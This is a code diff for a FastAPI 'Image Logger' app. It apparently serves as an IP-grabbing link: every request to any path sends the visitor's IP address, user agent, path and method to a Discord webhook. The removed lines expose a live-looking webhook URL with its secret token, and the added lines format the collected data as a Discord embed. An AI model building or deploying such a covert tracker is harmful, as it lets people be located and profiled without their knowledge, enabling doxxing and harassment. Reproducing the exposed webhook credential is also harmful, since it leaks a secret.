@@ -1,25 +1,40 @@
 from fastapi import FastAPI, Request
 import requests
+import os
 
 app = FastAPI()
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1489273954274119932/exL5TnsOQlbusCZFDdW7jQEN6Pr8y76nvGadZ2Co0r6wuwLFLHGJa66Vz5w1PoiBbdiE"
+# Use an environment variable for security
+WEBHOOK_URL = os.getenv("WEBHOOK_URL")  # Set this in Vercel environment variables
 
 @app.api_route("/{path:path}", methods=["GET", "POST"])
 async def handle_request(request: Request, path: str):
     try:
+        # Get client IP
         ip = request.headers.get("x-forwarded-for", request.client.host)
         user_agent = request.headers.get("user-agent")
 
-        data = {
-            "ip": ip,
-            "user_agent": user_agent,
-            "path": path,
-            "method": request.method
+        # Prepare Discord message
+        message = {
+            "username": "Image Logger",  # Display name in Discord
+            "embeds": [{
+                "title": "New Request Received",
+                "color": 0x00FFFF,
+                "fields": [
+                    {"name": "IP", "value": ip, "inline": True},
+                    {"name": "User-Agent", "value": user_agent, "inline": False},
+                    {"name": "Path", "value": path, "inline": True},
+                    {"name": "Method", "value": request.method, "inline": True}
+                ]
+            }]
         }
 
-        # ✅ FIXED: URL must be a string
-        requests.post(WEBHOOK_URL, json=data)
+        # Send to Discord webhook
+        response = requests.post(WEBHOOK_URL, json=message, timeout=5)
+
+        if response.status_code != 204:
+            # Discord returns 204 for success
+            return {"status": "error sending webhook", "details": response.text}
 
         return {"status": "ok"}
 
